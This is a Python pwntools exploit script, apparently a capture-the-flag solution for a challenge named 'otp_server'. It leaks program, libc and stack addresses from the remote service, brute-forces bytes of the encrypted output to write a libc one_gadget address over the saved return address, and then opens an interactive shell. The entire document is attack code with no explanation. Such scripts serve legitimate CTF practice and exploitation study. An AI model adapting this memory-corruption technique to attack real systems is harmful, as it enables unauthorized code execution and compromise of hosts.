from pwn import *

w = remote("challenges3.fbctf.com",1338)
ww = ELF("./otp_server")
www = ELF("./libc-2.27.so")

sla = w.sendlineafter
sl = w.sendline
sa = w.sendafter

def s_key(k):
    sla(">>>","1")
    sa(":",k)

def e_mess(e):
    sla(">>>","2")
    sa(":",e)

def g_mess():
    w.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
    print w.recvuntil("-----").encode("hex")
def leak(l):
    print hex(u64(l.ljust(8,"\x00")))
    return u64(l.ljust(8,"\x00"))

one = [ 0x4f2c5, 0x4f322, 0x10a38c ]
s_key("a"*0xa0)
e_mess("w"*0x100)

w.recvuntil("a")
w.recv(7)
leak(w.recv(4))

code = leak(w.recv(8)) - 0xdd0
libc = leak(w.recv(8)) - 0x21b97

w.info(libc)
leak(w.recv(8))
stack = leak(w.recv(8))

one_shot = p64(libc+one[0])
print hex(u64(one_shot))

for i in range(3,0,-1):
    found = 0
    pay = "l"*(0x9+0x7+i)+"\x00"
    while found == 0:
        sleep(0.5)
        s_key(pay)
        e_mess("w"*(0x100))
        w.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
        rand = w.recv(4)
        if ord(rand[3])^0x6c == ord(one_shot[i-1]):
            found = 1
            break
            
w.interactive()
